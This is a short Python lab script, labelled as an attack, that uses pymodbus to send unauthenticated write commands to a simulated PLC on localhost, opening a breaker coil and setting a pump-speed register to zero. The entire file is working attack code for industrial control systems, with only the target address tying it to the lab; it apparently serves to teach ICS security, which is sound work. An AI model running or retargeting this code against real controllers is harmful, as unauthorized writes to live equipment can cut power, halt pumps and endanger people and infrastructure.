"""Lab attack: send an unauthorized WRITE to the fake PLC (no login needed)."""
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("127.0.0.1", port=5020)
client.connect()

client.write_coil(0, False)         # open the breaker (switch it OFF)
client.write_register(0, 0)         # set pump speed to 0 rpm
print("Attack sent: breaker opened, pump speed set to 0")

client.close()